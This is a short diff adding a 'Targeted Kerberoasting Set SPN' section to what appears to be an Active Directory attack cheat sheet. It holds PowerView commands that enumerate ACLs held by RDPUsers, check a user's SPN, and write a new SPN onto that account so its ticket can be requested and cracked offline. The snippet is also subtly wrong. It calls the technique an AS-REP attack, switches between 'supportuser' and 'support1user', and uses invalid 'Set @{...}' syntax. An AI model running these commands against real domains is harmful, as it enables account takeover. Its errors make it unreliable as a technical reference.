@@ -60,3 +60,14 @@ C:> Get-DomainUser -PreauthNotRequired -Verbose    # Check
 
 ```
 ### Targeted Kerberoasting Set SPN
+With rights over a user, we can set a SPN to it, and then go for a AS-REPs attack.
+```powershell
+# Enumerate permissions for RDPUsers
+C:> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+# Check if user already has a SPN
+C:> Get-DomainUser -Identity supportuser | select serviceprincipalname
+
+# Set SPN for the user
+C:> Set-DomainObject -Identity support1user | Set @{serviceprincipalname='ops/whatever1'}
+```
